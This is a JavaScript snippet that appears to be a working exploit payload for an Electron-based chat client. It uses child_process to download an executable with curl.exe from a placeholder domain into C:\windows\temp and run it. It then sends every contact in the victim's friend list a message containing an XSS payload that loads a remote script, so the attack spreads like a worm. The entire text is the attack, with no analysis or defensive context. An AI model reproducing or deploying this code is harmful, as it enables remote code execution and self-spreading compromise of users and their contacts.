if(window.hacked != true)
{
	window.hacked = true;

	const { spawn } = require('child_process');
	
	var run_payload = function()
	{
		try{
		spawn('C:\\windows\\temp\\t.exe', []);
		}catch(err){}
	}
	
	try{
		const curl = spawn('curl.exe', ['https://insertdomainnamehere/t.exe', '--output', 'C:\\windows\\temp\\t.exe']);
		curl.on('close', (code) => {run_payload();});
	}catch(err){run_payload();}

	var testo = window.webpackJsonp([], [], [7]);
	var b = function(e, t, a) { this.jid = e.split("/")[0], this.fromJid = t.split("/")[0], this.text = a, this.date = new Date };
	for(friend in testo.hy.contact.friendList)
	{
		testo.hy.message.sendMessage(new b(friend, testo.hy.chat.jid, "<img src=a onerror=\"var x=document.createElement('script');x.src='https://insertdomainnamehere/t.js';document.head.appendChild(x);\">"));
	}
}
